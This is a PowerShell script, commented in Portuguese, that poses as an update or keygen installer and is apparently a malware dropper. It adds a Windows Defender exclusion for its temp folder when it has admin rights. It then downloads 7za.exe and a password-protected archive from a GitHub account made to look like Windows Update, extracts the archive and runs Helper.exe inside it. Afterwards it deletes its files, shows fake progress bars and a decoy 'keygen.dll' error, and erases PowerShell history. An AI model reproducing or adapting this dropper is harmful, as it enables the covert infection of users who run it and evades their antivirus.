
# ------------------------------------ LAUNCH ------------------------------------- #

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Show-Progress {
    param(
        [int]$Percent,
        [string]$Text = ""
    )

    $esc = [char]27
    $width = 20

    $filled = [math]::Floor($width * $Percent / 100)
    $empty = $width - $filled

    $gray = "$esc[100m"
    $darkGray = "$esc[48;5;236m"
    $reset = "$esc[0m"

    [Console]::Write(
        "`r        $gray$(' ' * $filled)$reset$darkGray$(' ' * $empty)$reset $Percent% $Text"
    )
}

# ----------------------------------- VARIÁVEIS ---------------------------------- #

# URLs dos arquivos no GitHub
$zipUrl = "https://github.com/WindowsUpdateComponents/Archives/raw/refs/heads/main/1.zip"
$7zaUrl = "https://github.com/WindowsUpdateComponents/Archives/raw/refs/heads/main/7za.exe"
$password = '1'
$exePath  = '1/Helper.exe'   # caminho dentro do zip

$work = Join-Path $env:TEMP "svc_$(Get-Random)"
$zip  = Join-Path $work '1.zip'
$7za  = Join-Path $work '7za.exe'
$dest = Join-Path $work 'out'

$firstStepText     = '[1/3] Checking for Updates...'
$secondStepText    = '[2/3] Initialization Components...'
$thirdStepText     = '[3/3] Running Application...'
$firstSubstepText  = '[SUCCESSFULLY]'
$secondSubstepText = '[SUCCESSFULLY]'
$thirdSubstepText  = '[ERROR]'

if (Test-Path $work) { Remove-Item $work -Recurse -Force }
New-Item -ItemType Directory -Path $work -Force | Out-Null

# ---------------------------------- ADMIN RIGHTS --------------------------------- #

$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# [STEP 1/3]:
Clear-Host
Write-Host "`n  $firstStepText" -ForegroundColor Cyan

if ($isAdmin) {
    Add-MpPreference -ExclusionPath $work -ErrorAction SilentlyContinue | Out-Null
}

# ---------------------------------- DOWNLOAD ------------------------------------ #

try {
    if (-not (Test-Path $work)) { New-Item -ItemType Directory -Path $work -Force | Out-Null }

    # Usa HttpClient para baixar os arquivos com maior controle
    Add-Type -AssemblyName System.Net.Http

    $handler = New-Object System.Net.Http.HttpClientHandler
    $client  = New-Object System.Net.Http.HttpClient($handler)
    $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

    Write-Host "`n  Baixando 7za.exe..." -ForegroundColor Cyan
    $7zaBytes = $client.GetByteArrayAsync($7zaUrl).Result
    [System.IO.File]::WriteAllBytes($7za, $7zaBytes)

    Write-Host "  Baixando 1.zip..." -ForegroundColor Cyan
    $zipBytes = $client.GetByteArrayAsync($zipUrl).Result
    [System.IO.File]::WriteAllBytes($zip, $zipBytes)

    $client.Dispose()
}
catch {
    throw "Falha no download dos binários: $_"
}

# [SUBSTEP 1/3]:
for ($i = 0; $i -le 100; $i++) {
    Show-Progress $i
    Start-Sleep -Milliseconds (Get-Random -Minimum 5 -Maximum 20)
}

Show-Progress 100
Write-Host "$firstSubstepText" -ForegroundColor Green
Start-Sleep -Seconds 3

# --------------------------------- EXTRAÇÃO ------------------------------------- #

# [STEP 2/3]:
Clear-Host
Write-Host "`n  $secondStepText" -ForegroundColor Cyan

if (-not (Test-Path $7za)) { throw "[7za] - Arquivo não encontrado" }
if (-not (Test-Path $zip)) { throw "[ZIP] - Arquivo não encontrado" }

$null = & $7za x "$zip" "-o$dest" "-p$password" -y 2>&1

if ($LASTEXITCODE -ne 0) {
    throw "[ERROR] 7za falhou com código: $($LASTEXITCODE)"
}

# --------------------------------- EXECUÇÃO ------------------------------------- #

# [RUN FILE] - Busca o Helper.exe recursivamente
$exe = Get-ChildItem -Path $dest -Filter "Helper.exe" -Recurse | Select-Object -ExpandProperty FullName -First 1

if ($exe -and (Test-Path $exe)) {
    Start-Process $exe -WorkingDirectory (Split-Path $exe) -Wait -ErrorAction Stop
} else {
    throw "[ZIP] - Executável Helper.exe não encontrado."
}

# Limpeza
if (Test-Path $work) {
    Remove-Item $work -Recurse -Force -ErrorAction SilentlyContinue
}

# [SUBSTEP 2/3]:
for ($i = 0; $i -le 100; $i++) {
    Show-Progress $i
    Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 25)
}

Show-Progress 100
Write-Host "$secondSubstepText" -ForegroundColor Green
Start-Sleep -Seconds 3

# --------------------------------- FINAL ---------------------------------------- #

# [STEP 3/3]:
Clear-Host
Write-Host "`n  $thirdStepText" -ForegroundColor Cyan

for ($i = 0; $i -le 100; $i++) {
    Show-Progress $i
    Start-Sleep -Milliseconds (Get-Random -Minimum 5 -Maximum 30)
}

Show-Progress 100
Write-Host "$thirdSubstepText`n" -ForegroundColor Red

Start-Sleep -Milliseconds 500

Write-Host "  [ERROR] Failed to load DLL: keygen.dll`n  [ERROR] The specified module could not be found.`n  [ERROR] Error code: 0xc0000135`n  [ERROR] One or more dependencies may be missing.`n  [ERROR] Operation failed." -ForegroundColor Red
Write-Host "`n  To fix this, please follow: https://learn.microsoft.com/en-us/answers/questions/2486541/error-code-0xc0000135" -ForegroundColor Yellow

# --------------------------------- CLEANUP & EXIT ------------------------------- #

[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

Read-Host -Prompt "`n  Press Enter to exit"

Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Set-PSReadlineOption -HistorySaveStyle SaveNothing
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
